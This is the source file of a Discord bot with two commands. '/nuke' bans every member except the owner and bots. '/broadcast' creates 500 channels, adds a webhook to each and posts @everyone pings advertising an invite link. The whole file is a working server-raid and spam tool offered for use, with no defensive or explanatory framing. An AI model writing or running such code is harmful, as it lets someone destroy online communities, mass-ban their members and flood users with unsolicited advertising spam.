const express = require('express');
const {
  Client,
  GatewayIntentBits,
  Partials,
  SlashCommandBuilder,
  REST,
  Routes,
  PermissionFlagsBits,
  ChannelType
} = require('discord.js');
require('dotenv').config();

// Web server for Render
const app = express();
const PORT = process.env.PORT || 3000;
app.get('/', (req, res) => res.send('Bot is running'));
app.listen(PORT, () => console.log(`🌐 Web server active on port ${PORT}`));

// Discord bot setup
const client = new Client({
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers],
  partials: [Partials.GuildMember],
});

client.once('ready', async () => {
  console.log(`🤖 Logged in as ${client.user.tag}`);

  const commands = [
    new SlashCommandBuilder()
      .setName('nuke')
      .setDescription('Ban all members except owner/bots')
      .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
      .toJSON(),
    new SlashCommandBuilder()
      .setName('broadcast')
      .setDescription('Create 500 channels & send @everyone via webhook')
      .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
      .toJSON(),
  ];

  const rest = new REST({ version: '10' }).setToken(process.env.TOKEN);
  await rest.put(Routes.applicationCommands(client.user.id), { body: commands });

  console.log('✅ Slash commands registered globally');
});

client.on('interactionCreate', async (interaction) => {
  if (!interaction.isChatInputCommand()) return;
  const guild = interaction.guild;

  if (!guild) return interaction.reply('❌ Use commands in a server only.');

  // /nuke - instant ban
  if (interaction.commandName === 'nuke') {
    if (interaction.user.id !== process.env.OWNER_ID) {
      return interaction.reply({ content: '❌ You cannot use this.', ephemeral: true });
    }

    await interaction.reply('⚠️ Banning all members...');

    const members = await guild.members.fetch();
    for (const [id, member] of members) {
      if (id === process.env.OWNER_ID || member.user.bot) continue;

      try {
        await member.ban({ reason: 'Nuked' });
        console.log(`🔨 Banned ${member.user.tag}`);
      } catch (err) {
        console.error(`❌ Couldn't ban ${member.user.tag}: ${err.message}`);
      }
    }

    interaction.followUp('✅ Done banning everyone possible.');
  }

  // /broadcast - fast webhook pings
  if (interaction.commandName === 'broadcast') {
    if (interaction.user.id !== process.env.OWNER_ID) {
      return interaction.reply({ content: '❌ You cannot use this.', ephemeral: true });
    }

    await interaction.reply('📡 Broadcasting via webhooks...');

    const total = 500;
    const batchSize = 20;
    const delay = 500;

    for (let i = 0; i < total; i += batchSize) {
      const batch = Array.from({ length: batchSize }, (_, j) => i + j + 1)
        .filter(n => n <= total)
        .map(async (num) => {
          try {
            const channel = await guild.channels.create({
              name: `vanir-${num}`,
              type: ChannelType.GuildText,
              permissionOverwrites: [
                {
                  id: guild.roles.everyone.id,
                  allow: ['ViewChannel', 'SendMessages'],
                },
              ],
            });

            const webhook = await channel.createWebhook({
              name: `Vanir-${num}`,
              avatar: client.user.displayAvatarURL(),
            });

            await webhook.send({
              content: `@everyone https://discord.gg/vanir`,
              allowedMentions: { parse: ['everyone'] }
            });

            console.log(`✅ vanir-${num}: sent`);
          } catch (err) {
            console.error(`❌ vanir-${num} error: ${err.message}`);
          }
        });

      await Promise.allSettled(batch);
      await new Promise(res => setTimeout(res, delay));
    }

    interaction.followUp('✅ Broadcast complete.');
  }
});

// Handle crashes
process.on('unhandledRejection', (reason) => {
  console.error('🧨 Unhandled Rejection:', reason);
});

process.on('uncaughtException', (err) => {
  console.error('💥 Uncaught Exception:', err);
});

client.login(process.env.TOKEN);
